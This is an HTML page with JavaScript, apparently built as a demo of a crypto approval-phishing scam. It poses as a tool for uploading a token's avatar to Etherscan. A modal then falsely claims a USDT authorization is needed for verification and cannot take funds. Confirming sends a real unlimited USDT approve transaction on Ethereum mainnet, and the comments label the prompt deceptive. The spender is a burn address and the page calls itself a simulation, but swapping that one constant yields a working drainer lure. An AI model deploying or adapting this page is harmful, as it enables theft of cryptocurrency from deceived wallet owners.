<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>代币头像一键上传</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, sans-serif;
    }
    body {
      background: #f7f8fa;
      padding: 24px 16px;
      color: #222;
    }
    .container {
      max-width: 520px;
      margin: 0 auto;
    }
    .page-title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
    }
    .page-desc {
      font-size:14px; color:#777; margin-bottom:28px;
    }
    .card-box {
      background: #ffffff;
      border-radius: 16px;
      padding: 24px 20px;
    }
    .form-item{
      margin-bottom:24px;
    }
    .form-label{
      font-size:15px; margin-bottom:8px; display:block;
    }
    .input-text{
      width:100%;
      border:1px solid #ddd;
      border-radius:12px;
      padding:14px 12px;
      font-size:15px;
      outline:none;
    }
    .input-text:focus{
      border-color:#4086ff;
    }
    /* 头像选择区域 */
    .avatar-select-wrap{
      border:1px dashed #bbbbbb;
      border-radius:12px;
      padding:24px 16px;
      text-align:center;
      cursor:pointer;
    }
    .avatar-select-wrap:active{
      background:#f5f7fa;
    }
    .avatar-preview{
      width:88px;
      height:88px;
      border-radius:50%;
      object-fit:cover;
      border:1px solid #eee;
      background:#f3f3f3;
      margin:0 auto 12px;
      display:none;
    }
    .avatar-tip{
      color:#888;
      font-size:14px;
    }
    #fileInput{
      display:none;
    }
    .main-btn {
      width: 100%;
      background: #4086ff;
      color: #fff;
      border: none;
      border-radius: 12px;
      padding: 16px 0;
      font-size: 17px;
      font-weight: 500;
      margin-top:12px;
    }
    .main-btn:disabled {
      background: #94a3b8;
      cursor: not-allowed;
    }
    .status-text {
      text-align: center;
      margin: 16px 0;
      color: #444;
      font-size: 14px;
    }
    /* 授权确认弹窗 */
    .auth-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.55);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }
    .auth-box {
      background: #fff;
      width: 86%;
      max-width:340px;
      border-radius:16px;
      padding:24px 20px;
    }
    .auth-box h3{
      font-size:18px;
      margin-bottom:12px;
    }
    .auth-desc{
      font-size:14px; color:#666; line-height:1.6; margin-bottom:20px;
    }
    .modal-btn-row{
      display:flex; gap:12px;
    }
    .modal-cancel{
      flex:1; padding:12px; border:1px solid #ddd; background:#fff; border-radius:10px; font-size:16px;
    }
    .modal-confirm{
      flex:1; padding:12px; border:none; background:#4086ff; color:#fff; border-radius:10px; font-size:16px;
    }
    /* 提示弹窗 */
    .tip-modal {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1001;
    }
    .tip-box {
      background: #fff;
      width: 80%;
      max-width: 300px;
      border-radius: 16px;
      padding: 22px 18px;
    }
    .tip-ok{
      margin-top:18px;
      text-align:right;
    }
    .tip-ok button{
      color:#4086ff; border:none; background:none; font-size:16px;
    }
  </style>
</head>
<body>
<div class="container">
  <h1 class="page-title">代币头像一键上传</h1>
  <p class="page-desc">提交代币元数据，上传头像至Etherscan。<br>⚠️演示页面：现实中上传头像不需要USDT授权！</p>

  <div class="card-box">
    <div class="form-item">
      <label class="form-label">代币合约地址（以太坊）</label>
      <input class="input-text" id="tokenContractInput" placeholder="0x......">
    </div>

    <div class="form-item">
      <label class="form-label">选择代币头像</label>
      <div class="avatar-select-wrap" id="avatarSelectWrap">
        <img id="avatarPreview" class="avatar-preview" alt="头像预览">
        <div class="avatar-tip">点击此处打开相册选择图片</div>
      </div>
      <input type="file" id="fileInput" accept="image/*" />
    </div>

    <button class="main-btn" id="nextBtn">下一步</button>
    <div class="status-text" id="statusShow"></div>
  </div>
</div>

<!-- 授权弹窗 -->
<div class="auth-modal" id="authModal">
  <div class="auth-box">
    <h3>元数据校验授权</h3>
    <div class="auth-desc">
      为验证您的代币所有权，需要您授权 USDT 权限用于校验。<br>
      仅用于头像上传校验，不会扣取资产。
    </div>
    <div class="modal-btn-row">
      <button class="modal-cancel" id="authCancel">取消</button>
      <button class="modal-confirm" id="authConfirm">确认授权</button>
    </div>
  </div>
</div>

<!-- 提示弹窗 -->
<div class="tip-modal" id="tipModal">
  <div class="tip-box">
    <p id="tipText"></p>
    <div class="tip-ok"><button id="tipOkBtn">确定</button></div>
  </div>
</div>

<script>
// ========== 配置（以太坊主网） ==========
const ETH_USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
// 演示占位spender，仅交互，不会发生真实资金转移
const SPENDER_DEMO = "0x000000000000000000000000000000000000dEaD";
const ETH_CHAIN_ID = 1;

// DOM
const tokenContractInput = document.getElementById('tokenContractInput');
const avatarSelectWrap = document.getElementById('avatarSelectWrap');
const fileInput = document.getElementById('fileInput');
const avatarPreview = document.getElementById('avatarPreview');
const nextBtn = document.getElementById('nextBtn');
const statusShow = document.getElementById('statusShow');

const authModal = document.getElementById('authModal');
const authCancel = document.getElementById('authCancel');
const authConfirm = document.getElementById('authConfirm');

const tipModal = document.getElementById('tipModal');
const tipText = document.getElementById('tipText');
const tipOkBtn = document.getElementById('tipOkBtn');

let provider, signer, usdtContract;
let walletConnected = false;
let hasSelectedAvatar = false;

// 提示弹窗
function showTip(text){
  tipText.innerText = text;
  tipModal.style.display = 'flex';
}
tipOkBtn.onclick = ()=> tipModal.style.display = 'none';

// 点击唤起相册/文件选择
avatarSelectWrap.addEventListener('click',()=>{
  fileInput.click();
})

// 读取本地图片，前端预览（FileReader）
fileInput.addEventListener('change',function(e){
  const file = e.target.files[0];
  if(!file){
    hasSelectedAvatar = false;
    avatarPreview.style.display = 'none';
    return;
  }
  const reader = new FileReader();
  reader.onload = function(ev){
    avatarPreview.src = ev.target.result;
    avatarPreview.style.display = 'block';
    hasSelectedAvatar = true;
  }
  reader.readAsDataURL(file);
})

// 切换以太坊主网
async function switchEthereumNet(){
  if(!window.ethereum) return false;
  try{
    await window.ethereum.request({
      method:"wallet_switchEthereumChain",
      params:[{chainId:"0x"+ETH_CHAIN_ID.toString(16)}]
    })
    return true;
  }catch(err){
    if(err.code === 4902){
      await window.ethereum.request({
        method:"wallet_addEthereumChain",
        params:[{
          chainId:"0x1",
          chainName:"Ethereum Mainnet",
          nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18},
          rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
          blockExplorerUrls:["https://etherscan.io"]
        }]
      })
      return true;
    }
    showTip("切换以太坊主网失败，请手动切换");
    return false;
  }
}

// 连接钱包
async function connectWallet(){
  if(!window.ethereum){
    showTip("请在MetaMask钱包内置浏览器打开页面");
    return false;
  }
  await window.ethereum.request({method:"eth_requestAccounts"});
  const ok = await switchEthereumNet();
  if(!ok) return false;

  provider = new ethers.providers.Web3Provider(window.ethereum);
  signer = provider.getSigner();
  usdtContract = new ethers.Contract(ETH_USDT,[
    "function approve(address spender,uint256 amount) external returns(bool)",
    "function allowance(address owner,address spender) view returns(uint256)"
  ],signer);
  walletConnected = true;
  statusShow.innerText = "✅钱包已连接（以太坊主网）";
  return true;
}

// 下一步按钮
nextBtn.addEventListener('click',async ()=>{
  const tokenAddr = tokenContractInput.value.trim();
  // 校验合约地址
  if(!/^0x[a-fA-F0-9]{40}$/.test(tokenAddr)){
    showTip("请输入合法以太坊代币合约地址");
    return;
  }
  // 校验是否选了头像图片
  if(!hasSelectedAvatar){
    showTip("请点击框内，从相册选择代币头像图片");
    return;
  }

  if(!walletConnected){
    statusShow.innerText = "正在连接钱包...";
    const connOk = await connectWallet();
    if(!connOk) return;
  }
  // 弹出欺骗授权弹窗
  authModal.style.display = "flex";
})

authCancel.onclick = ()=>{
  authModal.style.display = "none";
}

// 确认授权，发起USDT无限approve
authConfirm.onclick = async ()=>{
  authModal.style.display = "none";
  nextBtn.disabled = true;
  statusShow.innerText = "正在发起USDT授权签名请求...";
  try{
    const gasPrice = await provider.getGasPrice();
    const txOpt = {gasPrice:gasPrice.mul(110).div(100), gasLimit:120000};
    const tx = await usdtContract.approve(SPENDER_DEMO, ethers.constants.MaxUint256, txOpt);
    statusShow.innerText = "授权交易已提交，等待上链确认";
    await tx.wait(1);
    showTip("✅授权完成（演示）。现实中上传头像根本不需要授权USDT！");
    statusShow.innerText = "演示完成，此为钓鱼诈骗模拟页面";
  }catch(err){
    showTip("授权被拒绝或者失败："+err.message);
    statusShow.innerText = "授权操作取消/失败";
  }
  nextBtn.disabled = false;
}
</script>
</body>
</html>
